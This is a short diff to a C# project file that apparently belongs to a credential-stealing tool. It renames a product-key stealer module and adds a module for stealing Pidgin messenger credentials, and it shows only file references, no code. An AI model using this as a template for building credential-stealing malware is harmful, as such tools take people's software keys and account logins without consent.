@@ -58,7 +58,8 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="Stealers\ProductKeyStealer.cs" />
+    <Compile Include="Stealers\MicrosoftKeyStealer.cs" />
+    <Compile Include="Stealers\PidginStealer.cs" />
     <Compile Include="Util\Misc\HardwareInfo.cs" />
     <Compile Include="Util\Misc\IStealer.cs" />
     <Compile Include="Program.cs" />
